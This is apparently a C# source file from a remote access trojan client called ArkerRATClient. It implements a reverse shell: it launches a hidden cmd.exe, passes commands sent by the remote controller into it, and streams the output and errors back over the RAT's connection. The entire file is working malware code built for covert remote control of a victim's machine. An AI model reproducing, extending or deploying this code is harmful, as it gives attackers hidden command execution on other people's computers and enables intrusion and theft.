﻿using ArkerRATClient;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ARKERRATCLIENT2._0
{
    public static class ReverseShell
    {
        public static Process cmd;
        static bool hasStarted = false;
       static ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd");
       static string StandardError = "";


        public static async void reverseCMDSession(string data)
        {
            if (!hasStarted)
            {
                processStartInfo.FileName = "cmd.exe";
                processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
                processStartInfo.UseShellExecute = false;
                processStartInfo.RedirectStandardInput = true;
                processStartInfo.RedirectStandardOutput = true;
                processStartInfo.RedirectStandardError = true;
                processStartInfo.CreateNoWindow = true;
                cmd = Process.Start(processStartInfo);
                hasStarted = true;

               //FUNGEWRAR EJ MED STANDARERROR
                await Task.Run(async () =>
                {
                    while (hasStarted && !RATClientSession.noConnection)
                    {
                        try
                        {
                            if (StandardError.Length > 1)
                            {
                                await RATClientSession.SendData(StandardError + "§ReverseShell§\n");
                                StandardError = "";
                            }
                            else
                            {
                                await RATClientSession.SendData(cmd.StandardOutput.ReadLine().Trim(' ') + "§ReverseShell§\n");
                            }
                        }
                        catch { }
                    }
                });

                await Task.Run(() =>
                {
                    while (hasStarted && !RATClientSession.noConnection)
                    {
                        try
                        {
                            StandardError = cmd.StandardError.ReadLine().Trim(' ');
                        }
                        catch { }
                    }
                });
            }
            
            if (data.Contains("§close§") || RATClientSession.noConnection)
            {
                hasStarted = false;
                cmd.Kill();
            }
            else
            {
                cmd.StandardInput.WriteLine(data);
            }
        }
    }
}
